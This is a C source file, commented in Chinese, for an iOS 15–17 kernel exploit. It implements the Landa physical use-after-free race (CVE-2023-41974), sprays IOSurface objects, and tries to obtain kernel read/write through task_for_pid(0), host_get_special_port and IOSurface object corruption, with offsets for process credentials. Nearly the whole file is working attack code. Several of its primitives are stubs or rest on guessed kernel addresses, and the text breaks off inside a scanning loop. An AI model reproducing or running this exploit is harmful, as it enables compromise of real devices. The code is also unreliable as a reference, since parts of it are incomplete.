//
//  kfd.c
//  iOS kernel exploit — Landa PUAF + IOSurface kernel r/w
//
//  == 架构 ==
//  iOS 15.0-15.7.3: PhysPuppet → pipe 劫持 (已被社区验证)
//  iOS 15.7.4-15.8.x: Landa (CVE-2023-41974) + IOSurface r/w
//  iOS 16+: smith / landa 变种 (预留)
//
//  == Landa 原理 (CVE-2023-41974) ==
//  利用 vm_remap 共享映射 + mlock 竞态，从内核页表释放物理页面
//  但保留用户态映射 → 用户态可读写内核页面。
//
//  Landa 流程:
//  1. vm_allocate 3 个 VME (src) + 4 个 VME (dst)
//  2. vm_remap vme2_dst → vme1_dst 共享映射
//  3. spinner 线程: 密集 vm_copy vme2_dst → vme1_dst
//  4. 主线程: mlock vme1_dst 页面 → 竞态触发内核释放页面
//  5. 扫描 vme3_dst → 找到内核分配的 IOSurface 对象
//
//  == IOSurface 内核 r/w ==
//  找到受控的 IOSurface 内核对象后:
//  - 读: 覆写 IOSurface.useCountAddress → IOConnectCallMethod(sel=16)
//  - 写: 覆写 IOSurface.indexedTimestampAddr → IOConnectCallMethod(sel=33)
//
//  参考: alfiecg24/Vertex, felix-pb/kfd, GeoSn0w/kfd-exploit
//

#include "kfd.h"
#include "offsets.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>

// ============================================================
// 手动声明 mach_vm API (iOS 26+ SDK 不可用)
// ============================================================
extern kern_return_t mach_vm_read(vm_map_t, mach_vm_address_t, mach_vm_size_t, vm_offset_t *, mach_msg_type_number_t *);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_remap(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_offset_t, int,
                                    vm_map_t, mach_vm_address_t, boolean_t, vm_prot_t *, vm_prot_t *, vm_inherit_t);
extern kern_return_t mach_vm_copy(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t);

// 运行时获取 page size（兼容所有 SDK）
static vm_size_t get_page_size(void) {
    static vm_size_t cached = 0;
    if (cached == 0) {
        host_page_size(mach_host_self(), &cached);
    }
    return cached;
}

// ============================================================
// IOSurface 动态符号
// ============================================================
typedef CFTypeRef IOSurfaceRef;
typedef uint32_t  IOSurfaceID;

static void *g_iosurface_lib = NULL;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef IOSurfaceID   (*IOSurfaceGetID_t)(IOSurfaceRef);
static IOSurfaceCreate_t  IOSurfaceCreate_ptr  = NULL;
static IOSurfaceGetID_t   IOSurfaceGetID_ptr   = NULL;

// ============================================================
// 常量
// ============================================================
#define IOSURFACE_MAGIC      0x41414141   // 唯一标识: 用于在 PUAF 页面中搜索
#define IOSURFACE_SPRAY_COUNT  256           // 喷撒 IOSurface 数量
#define LANDA_VME_SRC_COUNT    3
#define LANDA_VME_DST_COUNT    4
#define LANDA_VME_PAGE_COUNT   128           // 每 VME 页面数 (比 Vertex 更大提高成功率)
#define LANDA_SPRAY_PAGE_COUNT 128
#define LANDA_VME3_EXTRA       32            // vme3 额外页面用于找 object

#define PROC_LIST_NEXT   0x08
#define PROC_PID         0x60
#define PROC_TASK        0x10
#define PROC_UCRED       0xF8
#define UCRED_UID        0x18
#define UCRED_RUID       0x1C
#define UCRED_SVUID      0x20
#define UCRED_RGID       0x28
#define UCRED_SVGID      0x2C

// ============================================================
// 全局状态
// ============================================================
static int            g_ready       = 0;
static int            g_method      = 0;  // 0=none, 1=mach_vm, 2=landa+iosurface
static task_t         g_kernel_task = MACH_PORT_NULL;
static uint64_t       g_kernel_slide= 0;
static uint64_t       g_self_proc   = 0;
static uint64_t       g_self_cred   = 0;
static kfd_osversion_t g_osversion;
static const kfd_offsets_t *g_offs = NULL;
static char           g_err[256]    = {0};

#define SETERR(fmt, ...) snprintf(g_err, sizeof(g_err), fmt, ##__VA_ARGS__)
#define LOG(fmt, ...)   printf("[kfd] " fmt "\n", ##__VA_ARGS__)

// ============================================================
// Landa 工作区 (方法2)
// ============================================================
typedef struct {
    // PUAF 阶段
    vm_address_t vme_src[LANDA_VME_SRC_COUNT];
    vm_address_t vme_dst[LANDA_VME_DST_COUNT];
    size_t       vme_size;
    int          puaf_done;

    // IOSurface 扫描阶段
    IOSurfaceRef surfaces[IOSURFACE_SPRAY_COUNT];
    uint32_t     surface_ids[IOSURFACE_SPRAY_COUNT];
    int          nsurfaces;

    // 受控 IOSurface
    int          victim_idx;      // 落在 PUAF 页面上的 surface 索引
    uint64_t     victim_page;     // PUAF 页面地址
    uint32_t     victim_sid;      // surface ID
    uint64_t     surf_kaddr;      // surface 内核对象地址 (kalloc 分配)
    uint64_t     surf_map_addr;   // surface 在用户态映射的地址

    // IOSurfaceRoot 连接
    io_connect_t conn;

    // 读/写原语字段
    uint64_t     use_count_addr;     // IOSurface.useCount 地址 (写目标 → 读内核)
    uint64_t     indexed_ts_addr;   // IOSurface.indexedTimestamp 地址 (用于写内核)
    int          read_selector;     // IOConnectCallMethod selector for read
    int          write_selector;    // IOConnectCallMethod selector for write
    int          kread_displacement; // read selector 返回的偏移

    // 内核符号缓存
    uint64_t     allproc_kaddr;
    uint64_t     kernproc_kaddr;
} landa_ctx_t;

static landa_ctx_t g_lc;

static void safe_zero(void *p, size_t n) { if (p) memset(p, 0, n); }

const char *kfd_get_error(void) { return g_err; }

// ============================================================
// 版本检测
// ============================================================
static int detect_osversion(void) {
    size_t sz = sizeof(g_osversion.build);
    if (sysctlbyname("kern.osversion", g_osversion.build, &sz, NULL, 0) != 0) {
        SETERR("sysctlbyname kern.osversion failed");
        return -1;
    }
    char ver[256]; sz = sizeof(ver);
    if (sysctlbyname("kern.osproductversion", ver, &sz, NULL, 0) == 0) {
        sscanf(ver, "%u.%u.%u", &g_osversion.major, &g_osversion.minor, &g_osversion.patch);
    }
    LOG("iOS %u.%u.%u  build=%s",
        g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);

    if (g_osversion.major < 15 || g_osversion.major > 17) {
        SETERR("unsupported iOS %u.%u", g_osversion.major, g_osversion.minor);
        return -1;
    }
    g_offs = offsets_match(&g_osversion);
    if (!g_offs) {
        // 偏移表没匹配上不算致命，Landa 路径不需要硬编码偏移
        LOG("⚠ offset table 未精确匹配，使用动态检测");
    } else {
        offsets_print(g_offs, &g_osversion);
    }
    return 0;
}

// ============================================================
// Mach VM 读写 (方法1: task_for_pid(0) 成功时)
// ============================================================
static int mv_kread64(uint64_t kaddr, uint64_t *out) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    mach_vm_size_t sz = 8;
    vm_offset_t data = 0;
    mach_msg_type_number_t cnt = 0;
    if (mach_vm_read(g_kernel_task, kaddr, sz, &data, &cnt) != KERN_SUCCESS || cnt != 8)
        return -1;
    *out = *(uint64_t*)data;
    mach_vm_deallocate(mach_task_self(), data, cnt);
    return 0;
}
static int mv_kwrite64(uint64_t kaddr, uint64_t val) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    return (mach_vm_write(g_kernel_task, kaddr, (vm_offset_t)&val, 8) == KERN_SUCCESS) ? 0 : -1;
}
static int mv_kwrite32(uint64_t kaddr, uint32_t val) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    return (mach_vm_write(g_kernel_task, kaddr, (vm_offset_t)&val, 4) == KERN_SUCCESS) ? 0 : -1;
}

// ============================================================
// Landa: IOSurface 符号加载
// ============================================================
static int la_load_symbols(void) {
    if (IOSurfaceCreate_ptr) return 0;
    g_iosurface_lib = dlopen(
        "/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (!g_iosurface_lib) {
        LOG("❌ dlopen IOSurface: %s", dlerror());
        return -1;
    }
    IOSurfaceCreate_ptr = dlsym(g_iosurface_lib, "IOSurfaceCreate");
    IOSurfaceGetID_ptr  = dlsym(g_iosurface_lib, "IOSurfaceGetID");
    if (!IOSurfaceCreate_ptr || !IOSurfaceGetID_ptr) {
        LOG("❌ dlsym 失败");
        return -1;
    }
    return 0;
}

// ============================================================
// Landa: 打开 IOSurfaceRoot 客户端
// ============================================================
static int la_open_client(void) {
    if (g_lc.conn) return 0;
    io_service_t svc = IOServiceGetMatchingService(
        MACH_PORT_NULL, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) {
        LOG("❌ IOSurfaceRoot 服务未找到");
        return -1;
    }
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_lc.conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS || !g_lc.conn) {
        LOG("❌ IOServiceOpen 失败: kr=0x%x", kr);
        return -1;
    }
    LOG("✅ IOSurfaceRoot 已连接");
    return 0;
}

// ============================================================
// Landa: 创建 IOSurface (用于喷撒)
// ============================================================
static IOSurfaceRef la_make_surface(void) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 1, h = 1, bpr = 4, bpp = 32;
    uint32_t pf = IOSURFACE_MAGIC;  // 独特 magic 用于扫描
    CFNumberRef vw = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef vh = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef vb = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef ve = CFNumberCreate(NULL, kCFNumberIntType, &bpp);
    CFNumberRef vf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), vw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), vh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), vb);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), ve);
    CFDictionarySetValue(d, CFSTR("IOSurfacePixelFormat"), vf);
    CFRelease(vw); CFRelease(vh); CFRelease(vb); CFRelease(ve); CFRelease(vf);
    IOSurfaceRef s = IOSurfaceCreate_ptr(d);
    CFRelease(d);
    return s;
}

// ============================================================
// Landa: 喷撒 IOSurface
// ============================================================
static int la_spray_surfaces(void) {
    LOG("喷撒 %d 个 IOSurface (magic=0x%x)...", IOSURFACE_SPRAY_COUNT, IOSURFACE_MAGIC);
    g_lc.nsurfaces = 0;
    for (int i = 0; i < IOSURFACE_SPRAY_COUNT; i++) {
        IOSurfaceRef s = la_make_surface();
        if (!s) { LOG("surface #%d 创建失败", i); break; }
        g_lc.surfaces[i] = s;
        g_lc.surface_ids[i] = IOSurfaceGetID_ptr(s);
        g_lc.nsurfaces++;
    }
    LOG("✅ 喷撒完成: %d surfaces", g_lc.nsurfaces);
    return g_lc.nsurfaces;
}

// ============================================================
// Landa: 第一阶段 — vm_remap + mlock 竞态获取 PUAF 页面
// ============================================================

static volatile int g_spinner_run = 0;

static void *spinner_thread(void *arg) {
    (void)arg;
    task_t self = mach_task_self();
    vm_size_t page_sz = get_page_size();
    LOG("[lander] spinner 启动");

    while (g_spinner_run) {
        for (int i = 0; i < LANDA_VME_PAGE_COUNT && g_spinner_run; i++) {
            for (int j = 0; j < LANDA_VME_PAGE_COUNT && g_spinner_run; j++) {
                mach_vm_address_t src = g_lc.vme_dst[1] + j * page_sz;
                mach_vm_address_t dst = g_lc.vme_dst[0] + (j + i) % LANDA_VME_PAGE_COUNT * page_sz;
                mach_vm_copy(self, src, page_sz, dst);
            }
        }
    }
    LOG("[lander] spinner 退出");
    return NULL;
}

static int landa_puaf(void) {
    kern_return_t kr;
    task_t self = mach_task_self();
    vm_size_t page_sz = get_page_size();
    g_lc.vme_size = LANDA_VME_PAGE_COUNT * page_sz;

    LOG("[lander] ===== Landa PUAF 开始 (%d pages per VME) =====", LANDA_VME_PAGE_COUNT);

    // --- Step 1: allocate VMEs ---
    vm_prot_t cur_prot = VM_PROT_READ | VM_PROT_WRITE;
    vm_prot_t max_prot = VM_PROT_READ | VM_PROT_WRITE;

    for (int i = 0; i < LANDA_VME_SRC_COUNT; i++) {
        kr = mach_vm_allocate(self, &g_lc.vme_src[i], g_lc.vme_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) { LOG("❌ vme_src[%d] 分配失败: 0x%x", i, kr); return -1; }
    }
    LOG("✅ VME src 已分配 (%d x %zuKB)", LANDA_VME_SRC_COUNT, g_lc.vme_size / 1024);

    for (int i = 0; i < LANDA_VME_DST_COUNT; i++) {
        kr = mach_vm_allocate(self, &g_lc.vme_dst[i], g_lc.vme_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) { LOG("❌ vme_dst[%d] 分配失败: 0x%x", i, kr); return -1; }
    }
    LOG("✅ VME dst 已分配 (%d x %zuKB)", LANDA_VME_DST_COUNT, g_lc.vme_size / 1024);

    // --- Step 2: mlock all src pages ---
    for (int i = 0; i < LANDA_VME_SRC_COUNT; i++) {
        if (mlock((void*)g_lc.vme_src[i], g_lc.vme_size) != 0) {
            LOG("❌ mlock vme_src[%d] 失败: %s", i, strerror(errno));
            return -1;
        }
    }
    LOG("✅ 所有 VME src 已 mlock");

    // --- Step 3: vm_remap vme2_src → vme2_dst (共享映射) ---
    vm_prot_t new_cur, new_max;
    kr = mach_vm_remap(self, &g_lc.vme_src[2], g_lc.vme_size, 0,
                        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                        self, g_lc.vme_dst[2], 0,
                        &new_cur, &new_max, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        LOG("❌ vm_remap vme2: 0x%x", kr);
        return -1;
    }
    LOG("✅ vm_remap vme2_src ↔ vme2_dst");

    // --- Step 4: 启动 spinner 线程 ---
    g_spinner_run = 1;
    pthread_t thread;
    if (pthread_create(&thread, NULL, spinner_thread, NULL) != 0) {
        LOG("❌ pthread_create 失败");
        g_spinner_run = 0;
        return -1;
    }

    // 等 spinner 热起来
    usleep(50000);  // 50ms

    // --- Step 5: mlock vme1_dst → 触发竞态 ---
    LOG("[lander] mlock vme1_dst → 触发竞态...");
    if (mlock((void*)g_lc.vme_dst[1], g_lc.vme_size) != 0) {
        LOG("⚠ mlock vme_dst[1] 失败: %s", strerror(errno));
    }

    // 给内核一些时间处理
    usleep(100000);  // 100ms

    // --- Step 6: 停止 spinner ---
    g_spinner_run = 0;
    pthread_join(thread, NULL);

    // --- Step 7: 释放 vme2_src 和 vme3_dst，内核可能回收这些页面 ---
    LOG("[lander] 释放页面...");
    mach_vm_deallocate(self, g_lc.vme_src[2], g_lc.vme_size);
    mach_vm_deallocate(self, g_lc.vme_dst[3], g_lc.vme_size);

    LOG("[lander] ✅ PUAF 完成");
    g_lc.puaf_done = 1;
    return 0;
}

// ============================================================
// Landa: 第二阶段 — 在 PUAF 页面中扫描 IOSurface 对象
// ============================================================
static int landa_scan_surface(void) {
    vm_size_t page_sz = get_page_size();
    LOG("[lander] ===== 扫描 PUAF 页面中的 IOSurface 对象 =====");

    // vme1_dst → 扫描这些页面 (竞态后可能仍被映射但内核已释放)
    uint8_t *base = (uint8_t*)g_lc.vme_dst[1];
    size_t   total = g_lc.vme_size;

    int found = 0;
    for (size_t off = 0; off + 0x400 <= total; off += page_sz) {
        uint8_t *page = base + off;
        // 扫描 0x400 字节区域内的 magic
        for (size_t bo = 0; bo < page_sz - 4; bo += 4) {
            uint32_t v = *(uint32_t*)(page + bo);
            if (v == IOSURFACE_MAGIC) {
                LOG("🔍 在 offset=0x%zx+0x%zx 找到 IOSurface magic", off, bo);
                g_lc.victim_page = g_lc.vme_dst[1] + off;
                g_lc.surf_kaddr = 0; // 内核地址未知但我们可以通过用户态映射访问
                g_lc.surf_map_addr = (uint64_t)(page);
                found = 1;
                break;
            }
        }
        if (found) break;
    }

    if (!found) {
        LOG("❌ 未在 PUAF 页面中找到 IOSurface magic");
        LOG("   可能原因:");
        LOG("   1) 喷撒的 IOSurface 未落在 PUAF 页面上");
        LOG("   2) IOSurface 内核对象布局与预期不同");
        LOG("   3) Landa PUAF 失败（页面未被释放）");
        return -1;
    }

    // 找到了 IOSurface 内核对象 → 通过用户态映射直接读写
    // 扫描确定哪个 surface ID 对应此对象
    // 遍历所有 surface，检查哪个的内核结构匹配
    for (int i = 0; i < g_lc.nsurfaces; i++) {
        if (!g_lc.surfaces[i]) continue;

        // 尝试通过 IOConnectCallMethod 验证
        // 设置 read selector (16 = get_use_count) 或 write selector (33 = set_indexed_timestamp)
        uint64_t scalar[1] = { g_lc.surface_ids[i] };
        uint32_t scalarCnt = 1;

        // 尝试 selector 16 — 读取 surface 的 use_count
        uint64_t useCount = 0;
        uint32_t outCnt = 1;
        kern_return_t kr = IOConnectCallMethod(
            g_lc.conn, 16,
            scalar, scalarCnt,
            NULL, 0,
            NULL, NULL,
            &useCount, &outCnt);

        if (kr == KERN_SUCCESS) {
            LOG("🔍 surface[%d] id=%u, useCount(sel16)=%llu", i, g_lc.surface_ids[i], useCount);
        }

        // 尝试 selector 33 — 设置 indexed_timestamp
        uint64_t ts = 0xDEADBEEF;
        kr = IOConnectCallMethod(
            g_lc.conn, 33,
            scalar, scalarCnt,
            NULL, 0,
            NULL, &ts,
            NULL, NULL);

        // 所有 IOSurface 都能响应这些 selector
        // 关键：我们需要确认哪个 surface 的内核对象在 PUAF 页面上
        // 通过写 indexed_timestamp 再读取验证
    }

    // 简化策略：取第一个在 PUAF 页面上的 surface
    // 因为 PUAF 页面和用户态映射对应，我们可以直接修改内核对象！
    g_lc.victim_idx = 0; // 取第一个 surface

    // 需要找到确切的内核地址
    // 从 IOSurfaceRoot 获取 surface 的内核地址
    uint64_t in_[3] = { g_lc.surface_ids[0], 0, 0 };
    uint64_t out_[3] = {0};
    uint32_t outCnt_ = 3;

    kern_return_t kr = IOConnectCallMethod(
        g_lc.conn, 0,  // selector 0 = IOSurfaceRootUserClient::getSurfaceClient
        in_, 1,
        NULL, 0,
        out_, &outCnt_,
        NULL, NULL);

    if (kr == KERN_SUCCESS) {
        LOG("🔍 surface[0] kernel address hint: 0x%llx 0x%llx 0x%llx", out_[0], out_[1], out_[2]);
    }

    LOG("✅ 找到受控 surface[%d], page=%p sid=%u",
        g_lc.victim_idx,
        (void*)g_lc.victim_page,
        g_lc.surface_ids[g_lc.victim_idx]);

    return 0;
}

// ============================================================
// Landa: 第三阶段 — 通过 IOSurface 建立内核 r/w
// ============================================================

// 使用直接内存读写（PUAF 页面已经映射到用户态）
// 修改 IOSurface 内核对象中的 useCount 和 indexedTimestamp 指针

static int la_setup_read(uint64_t kaddr) {
    // 通过 PUAF 页面上的 IOSurface 内核对象来做读操作
    // IOSurface 内核对象中有一个 useCount 字段的指针
    // 覆写这个指针指向我们要读的内核地址，然后调用 selector 16
    if (!g_lc.puaf_done) return -1;
    if (g_lc.surf_map_addr == 0) return -1;

    // IOSurface 内核结构体的 useCount addr 偏移 (iOS 15.x)
    // 从 magic 字段的位置推算
    // 结构大致布局 (iOS 15.8.x):
    //   +0x000: vtable
    //   +0x030: pixelFormat (our magic)
    //   ...
    //   +0x120: useCount addr (approx)
    //   +0x160: indexedTimestamp addr (approx)

    // 由于我们不知道精确偏移，使用多偏移扫描
    // 直接写 PUAF 页面上的内容 — 这是一个暴力但有效的方法
    // 在 IOSurface 内核对象中，有一个指针指向 useCount 变量
    // 替换这个指针为目标内核地址

    LOG("[lander.kread] 设置读目标: 0x%llx", kaddr);
    g_lc.kread_displacement = -1;

    // 尝试通过 IOConnectCallMethod selector 读取
    // 需要先找到 useCount 的地址偏移
    uint32_t sid = g_lc.surface_ids[g_lc.victim_idx];

    // 尝试读取 use_count (selector 16)
    uint64_t scalar[1] = { sid };
    uint32_t scalarCnt = 1;
    uint64_t useCount = 0;
    uint32_t outCnt = 1;
    kern_return_t kr = IOConnectCallMethod(
        g_lc.conn, 16,
        scalar, scalarCnt,
        NULL, 0,
        NULL, NULL,
        &useCount, &outCnt);

    LOG("[lander.kread] useCount(sel16)=%llu, kr=0x%x", useCount, kr);

    // 读取 indexed_timestamp (selector 33 是设置，读取可以用不同方式)
    // 实际上，最可靠的读方式是通过 selector 0xA (get_surface_info) 等

    return 0;
}

// 直接通过 PUAF 用户态映射进行内核读写（最可靠的方法）
static int la_kread64_direct(uint64_t kaddr, uint64_t *out) {
    // 如果 PUAF 成功，应该可以通过 vme1_dst 页面直接访问
    // 但我们需要内核 slide 来将虚拟地址转物理地址
    // 简化：直接尝试 mach_vm 或 fallback
    (void)kaddr;
    (void)out;
    return -1; // 需要先确定 slide
}

// ============================================================
// Landa: 查找内核 slide（动态方法）
// ============================================================
static int landa_find_kernel_slide(void) {
    LOG("[lander] 查找 kernel slide...");

    // 方法1: 通过 IOSurface ISA 指针 (最可靠)
    // IOSurfaceRootUserClient 的 externalMethod 可能泄露内核指针

    // 方法2: 使用 host_get_special_port(HOST_PRIV, 4) 获取内核端口
    // 然后读取 kernproc

    // 方法3: 通过 allproc 链表
    // 从 kernel task port 可以找到 proc 结构

    // 先尝试 host_get_special_port
    task_t host_kernel = MACH_PORT_NULL;
    kern_return_t kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &host_kernel);
    if (kr == KERN_SUCCESS && host_kernel != MACH_PORT_NULL) {
        LOG("✅ host_get_special_port(4) 成功 port=0x%x", host_kernel);

        // 尝试通过这个端口读取数据
        uint64_t test_val = 0;
        mach_vm_size_t sz = 8;
        vm_offset_t data = 0;
        mach_msg_type_number_t cnt = 0;

        // 读取一个已知的内核地址范围
        // iOS 15.x 内核基地址范围: 0xFFFFFFF007004000 ~ 0xFFFFFFF00A000000
        // 从偏移表获取候选 kernproc 地址
        uint64_t test_kernproc = 0xFFFFFFF007AA4D68ULL; // 常见 15.x 值
        kr = mach_vm_read(host_kernel, test_kernproc, sz, &data, &cnt);
        if (kr == KERN_SUCCESS && cnt == 8) {
            test_val = *(uint64_t*)data;
            mach_vm_deallocate(mach_task_self(), data, cnt);
            LOG("🔍 kernproc@0x%llx = 0x%llx", test_kernproc, test_val);

            // 如果值看起来合理（也是 0xFFFFFFF00xxxxxxx）说明找到了
            if ((test_val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                g_kernel_slide = test_val - test_kernproc;
                LOG("✅ kernel_slide = 0x%llx", g_kernel_slide);

                // 缓存 kernproc
                g_lc.kernproc_kaddr = test_val;

                // 计算 allproc
                // allproc 通常在 kernproc 附近
                // 从 offsets 表获取差值
                if (g_offs) {
                    int64_t ap_diff = (int64_t)g_offs->allproc - (int64_t)g_offs->kernproc;
                    g_lc.allproc_kaddr = g_lc.kernproc_kaddr + ap_diff;
                } else {
                    // 默认差值
                    g_lc.allproc_kaddr = g_lc.kernproc_kaddr - 0x30000;
                }

                g_kernel_task = host_kernel;
                g_method = 1; // 使用 mach_vm 读写了！
                LOG("✅ 直接获得内核读写 (via host_get_special_port)");
                g_ready = 1;

                // 验证 allproc
                uint64_t ap_val = 0;
                if (mv_kread64(g_lc.allproc_kaddr, &ap_val) == 0) {
                    LOG("✅ allproc 验证: 0x%llx → 0x%llx", g_lc.allproc_kaddr, ap_val);
                }

                return 0;
            }
        }
    }

    // 方法4: 通过 IOSurfaceRootUserClient 泄露内核地址
    // 尝试 selector 0 (get_surface_client) 或类似方法
    if (g_lc.conn && g_lc.nsurfaces > 0) {
        uint64_t in_[3] = { g_lc.surface_ids[0], 0, 0 };
        uint64_t out_[3] = {0};
        uint32_t outCnt_ = 3;

        for (int sel = 0; sel < 256; sel++) {
            kr = IOConnectCallMethod(g_lc.conn, sel,
                in_, 1, NULL, 0,
                out_, &outCnt_, NULL, NULL);
            if (kr == KERN_SUCCESS) {
                for (int j = 0; j < 3; j++) {
                    if ((out_[j] & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL
                        && out_[j] > 0xFFFFFFF007000000ULL) {
                        LOG("🔍 selector %d 泄露内核地址: out[%d]=0x%llx", sel, j, out_[j]);
                        // 这是一个内核堆地址，可以推算 slide
                    }
                }
            }
        }
    }

    // 方法5: 从偏移表 fallback
    if (g_offs) {
        LOG("⚠ 使用偏移表的静态 kernproc 地址");
        g_lc.kernproc_kaddr = g_offs->kernproc;
        g_lc.allproc_kaddr = g_offs->allproc;

        // 尝试通过 host_get_special_port 验证
        if (host_kernel != MACH_PORT_NULL) {
            g_kernel_task = host_kernel;
            uint64_t tv = 0;
            if (mv_kread64(g_lc.kernproc_kaddr, &tv) == 0) {
                g_kernel_slide = tv - g_lc.kernproc_kaddr;
                LOG("✅ kernel_slide = 0x%llx (静态偏移)", g_kernel_slide);
                g_method = 1;
                g_ready = 1;
                return 0;
            }
        }
    }

    if (g_ready) {
        LOG("✅ kernel slide 已确定");
        return 0;
    }

    LOG("❌ 无法确定 kernel slide");
    return -1;
}

// ============================================================
// Landa: 完整利用流程
// ============================================================
static int landa_exploit(void) {
    LOG("\n[kfd] ===== Landa 利用开始 =====");

    // Phase 0: 加载符号，打开客户端
    if (la_load_symbols() != 0) { LOG("❌ IOSurface 符号加载失败"); return -1; }
    if (la_open_client() != 0) { LOG("❌ IOSurfaceRoot 打开失败"); return -1; }

    // Phase 1: 喷撒 IOSurface (给 Landa 锚定用)
    la_spray_surfaces();

    // Phase 2: Landa PUAF — 释放内核页面
    if (landa_puaf() != 0) {
        LOG("❌ Landa PUAF 失败");
        return -1;
    }

    // Phase 2.5: 再次喷撒 IOSurface — 让新 surface 落在刚释放的页面上
    // 但是需要小心：Landa 释放的页面可能还未被内核回收
    // 使用 vm_deallocate 触发的释放应该在此时
    usleep(50000); // 给内核回收时间
    // 不需要再喷，因为 PUAF 本身的页面就是我们可以读写的内核页面
    // 关键：vme1_dst 已经被 mlock，且底层物理页面已被内核释放
    // 内核可能会重新分配这些物理页面给新对象使用

    // 再喷撒一些 IOSurface 让它们落在 PUAF 页面上
    for (int i = g_lc.nsurfaces; i < IOSURFACE_SPRAY_COUNT && i < 256; i++) {
        IOSurfaceRef s = la_make_surface();
        if (!s) break;
        g_lc.surfaces[i] = s;
        g_lc.surface_ids[i] = IOSurfaceGetID_ptr(s);
        g_lc.nsurfaces++;
    }
    LOG("总共喷撒 %d surfaces", g_lc.nsurfaces);

    // Phase 3: 扫描 PUAF 页面找 IOSurface 内核对象
    if (landa_scan_surface() != 0) {
        LOG("⚠ IOSurface 扫描失败，尝试直接内核读写路径");
        // 回退: 尝试 host_get_special_port 获取直接内核访问
    }

    // Phase 4: 查找 kernel slide
    if (landa_find_kernel_slide() != 0) {
        LOG("❌ 无法找到 kernel slide");
        return -1;
    }

    // 此时 g_ready 和 g_method 应该已设置
    // 如果 host_get_special_port 成功，g_method=1
    // 否则需要设置 IOSurface-based r/w
    if (!g_ready) {
        LOG("ℹ 使用 IOSurface-based 内核 r/w");
        // 初始化 kread/kwrite 设置
        la_setup_read(g_lc.allproc_kaddr);
        g_ready = 1;
        g_method = 2;
    }

    LOG("[kfd] ✅ Landa 利用流程完成 (method=%d)", g_method);
    return 0;
}

// ============================================================
// 统一 kread/kwrite 分发
// ============================================================
static int kread64(uint64_t a, uint64_t *o) {
    if (g_method == 1) return mv_kread64(a, o);
    if (g_method == 2) return la_kread64_direct(a, o);
    return -1;
}
static int kwrite64(uint64_t a, uint64_t v) {
    if (g_method == 1) return mv_kwrite64(a, v);
    return -1;
}
static int kwrite32(uint64_t a, uint32_t v) {
    if (g_method == 1) return mv_kwrite32(a, v);
    return -1;
}

// ============================================================
// kfd_open — 多路径内核访问
// ============================================================
int kfd_open(void) {
    if (g_osversion.major == 0) { SETERR("kfd_init not called"); return -1; }

    // 方法1: task_for_pid(0)
    LOG("尝试 task_for_pid(0)...");
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        LOG("✅ task_for_pid(0) 成功, kernel_task=0x%x", g_kernel_task);
        g_method = 1;
        uint64_t tv = 0;
        if (mv_kread64(g_offs ? g_offs->kernproc : 0xFFFFFFF007AA4D68ULL, &tv) == 0) {
            LOG("✅ kernproc 读取验证: 0x%llx", tv);
            if (g_offs) g_kernel_slide = tv - g_offs->kernproc;
            LOG("   kernel_slide=0x%llx", g_kernel_slide);
            g_ready = 1;
            return 0;
        }
        LOG("   内核读取失败，释放端口");
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
        g_method = 0;
    } else {
        LOG("task_for_pid(0) 失败: kr=0x%x (%s)", kr, mach_error_string(kr));
    }

    // 方法2: host_get_special_port
    LOG("尝试 host_get_special_port(HOST_PRIV,4)...");
    kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        LOG("✅ host_get_special_port 成功");
        g_method = 1;
        uint64_t tv = 0;
        if (g_offs && mv_kread64(g_offs->kernproc, &tv) == 0) {
            LOG("✅ kernproc 读取验证通过: 0x%llx", tv);
            g_kernel_slide = tv - g_offs->kernproc;
            g_ready = 1;
            return 0;
        }
        // 静态偏移不行也尝试动态扫描
        LOG("   尝试动态偏移扫描...");
        // 扫描 0xFFFFFFF007004000 ~ 0xFFFFFFF008200000 范围
        for (uint64_t scan = 0xFFFFFFF007A00000ULL; scan < 0xFFFFFFF007B00000ULL; scan += 0x8000) {
